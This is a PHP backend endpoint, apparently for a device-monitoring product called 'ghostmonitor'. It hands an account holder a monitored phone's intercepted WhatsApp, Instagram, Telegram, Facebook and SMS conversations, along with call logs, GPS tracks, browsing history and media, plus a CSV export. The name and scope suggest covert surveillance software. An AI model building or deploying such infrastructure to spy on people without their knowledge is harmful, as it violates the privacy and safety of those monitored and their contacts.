<?php
require '../config.php';
header('Content-Type: application/json');

if (!isset($_SESSION['parent_email'])) {
    http_response_code(401);
    exit(json_encode(['error' => 'Unauthorized']));
}

$email  = $_SESSION['parent_email'];
$type   = $_GET['type']   ?? 'overview';
$action = $_GET['action'] ?? '';

// ── CSV Export ────────────────────────────────────────────────────────────────
if ($action === 'export') {
    $stmt = $pdo->prepare("
        SELECT app_type, contact_name, content, direction,
               FROM_UNIXTIME(timestamp/1000) as datetime
        FROM conversations
        WHERE parent_email = ?
        ORDER BY timestamp DESC
    ");
    $stmt->execute([$email]);
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);

    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="ghostmonitor_' . date('Y-m-d') . '.csv"');
    $out = fopen('php://output', 'w');
    fputcsv($out, ['App', 'Contact', 'Message', 'Direction', 'DateTime']);
    foreach ($data as $row) {
        fputcsv($out, [
            $row['app_type'],
            $row['contact_name'],
            substr($row['content'] ?? '', 0, 200),
            $row['direction'],
            $row['datetime']
        ]);
    }
    exit;
}

// ── Overview stats ────────────────────────────────────────────────────────────
if ($type === 'overview') {
    $stmt = $pdo->prepare("
        SELECT
            COUNT(*) as total_messages,
            SUM(CASE WHEN app_type = 'CALLS' THEN 1 ELSE 0 END) as total_calls
        FROM conversations
        WHERE parent_email = ?
          AND FROM_UNIXTIME(timestamp/1000) >= CURDATE()
    ");
    $stmt->execute([$email]);
    $stats = $stmt->fetch(PDO::FETCH_ASSOC);

    $stmtLoc = $pdo->prepare("
        SELECT COUNT(*) as location_updates
        FROM locations
        WHERE parent_email = ?
          AND FROM_UNIXTIME(timestamp/1000) >= CURDATE()
    ");
    $stmtLoc->execute([$email]);
    $locStats = $stmtLoc->fetch(PDO::FETCH_ASSOC);

    // Device online status — online if last_seen within 3 minutes
    $stmtDev = $pdo->prepare("
        SELECT device_id, last_seen,
               CASE WHEN last_seen >= DATE_SUB(NOW(), INTERVAL 3 MINUTE)
                    THEN 'online' ELSE 'offline' END as status
        FROM devices WHERE parent_email = ?
        ORDER BY last_seen DESC
    ");
    $stmtDev->execute([$email]);
    $devices = $stmtDev->fetchAll(PDO::FETCH_ASSOC);

    echo json_encode([
        'total_messages'   => (int)$stats['total_messages'],
        'total_calls'      => (int)$stats['total_calls'],
        'location_updates' => (int)$locStats['location_updates'],
        'devices'          => $devices,
    ]);
    exit;
}

// ── Messaging apps — contact list ─────────────────────────────────────────────
$appMap = [
    'whatsapp'  => 'WHATSAPP',
    'instagram' => 'INSTAGRAM',
    'telegram'  => 'TELEGRAM',
    'facebook'  => 'FACEBOOK',
    'sms'       => 'SMS',
];

if (isset($appMap[$type])) {
    $appType = $appMap[$type];
    $search  = $_GET['search'] ?? '';

    // Thread view — messages for a specific contact
    if ($action === 'thread') {
        $contactId = $_GET['contact_id'] ?? '';
        $stmt = $pdo->prepare("
            SELECT id, direction, content, media_meta,
                   FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
            FROM conversations
            WHERE parent_email = ? AND app_type = ? AND contact_id = ?
            ORDER BY timestamp ASC
            LIMIT 500
        ");
        $stmt->execute([$email, $appType, $contactId]);
        echo json_encode(['messages' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
        exit;
    }

    // Contact list
    $query  = "
        SELECT contact_id, contact_name,
               COUNT(*) as message_count,
               MAX(timestamp) as last_ts,
               FROM_UNIXTIME(MAX(timestamp)/1000) as last_message_time,
               (SELECT content FROM conversations c2
                WHERE c2.parent_email = c.parent_email
                  AND c2.app_type = c.app_type
                  AND c2.contact_id = c.contact_id
                ORDER BY timestamp DESC LIMIT 1) as last_message
        FROM conversations c
        WHERE parent_email = ? AND app_type = ?
    ";
    $params = [$email, $appType];

    if ($search) {
        $query  .= " AND (contact_name LIKE ? OR contact_id LIKE ?)";
        $params[] = "%$search%";
        $params[] = "%$search%";
    }

    $query .= " GROUP BY contact_id, contact_name ORDER BY last_ts DESC LIMIT 200";
    $stmt   = $pdo->prepare($query);
    $stmt->execute($params);
    echo json_encode(['contacts' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
    exit;
}

// ── Calls ─────────────────────────────────────────────────────────────────────
if ($type === 'calls') {
    $start = isset($_GET['start']) ? strtotime($_GET['start']) * 1000 : (time() - 86400) * 1000;
    $end   = isset($_GET['end'])   ? strtotime($_GET['end'])   * 1000 : time() * 1000;

    $stmt = $pdo->prepare("
        SELECT contact_name, contact_id, direction, content,
               FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
        FROM conversations
        WHERE parent_email = ? AND app_type = 'CALLS'
          AND timestamp BETWEEN ? AND ?
        ORDER BY timestamp DESC
        LIMIT 500
    ");
    $stmt->execute([$email, $start, $end]);
    echo json_encode(['calls' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
    exit;
}

// ── Location ──────────────────────────────────────────────────────────────────
if ($type === 'location' || $type === 'locations') {
    $start = isset($_GET['start']) ? strtotime($_GET['start']) * 1000 : (time() - 86400) * 1000;
    $end   = isset($_GET['end'])   ? strtotime($_GET['end'])   * 1000 : time() * 1000;

    $stmt = $pdo->prepare("
        SELECT lat, lng, accuracy,
               FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
        FROM locations
        WHERE parent_email = ?
          AND timestamp BETWEEN ? AND ?
        ORDER BY timestamp ASC
        LIMIT 1000
    ");
    $stmt->execute([$email, $start, $end]);
    echo json_encode(['locations' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
    exit;
}

// ── Browsing ──────────────────────────────────────────────────────────────────
if ($type === 'browsing') {
    $filter = $_GET['filter'] ?? 'today';
    $since  = match($filter) {
        'week'  => strtotime('-7 days') * 1000,
        'month' => strtotime('-30 days') * 1000,
        default => strtotime('today') * 1000,
    };

    $stmt = $pdo->prepare("
        SELECT contact_name as title, content as url,
               FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
        FROM conversations
        WHERE parent_email = ? AND app_type = 'BROWSING'
          AND timestamp >= ?
        ORDER BY timestamp DESC
        LIMIT 500
    ");
    $stmt->execute([$email, $since]);
    echo json_encode(['history' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
    exit;
}

// ── Media ─────────────────────────────────────────────────────────────────────
if ($type === 'media') {
    $stmt = $pdo->prepare("
        SELECT app_type, contact_name, media_meta,
               FROM_UNIXTIME(timestamp/1000) as datetime, timestamp
        FROM conversations
        WHERE parent_email = ? AND app_type = 'MEDIA'
          AND media_meta IS NOT NULL
        ORDER BY timestamp DESC
        LIMIT 200
    ");
    $stmt->execute([$email]);
    echo json_encode(['media' => $stmt->fetchAll(PDO::FETCH_ASSOC)]);
    exit;
}

http_response_code(400);
echo json_encode(['error' => 'Unknown type']);
?>
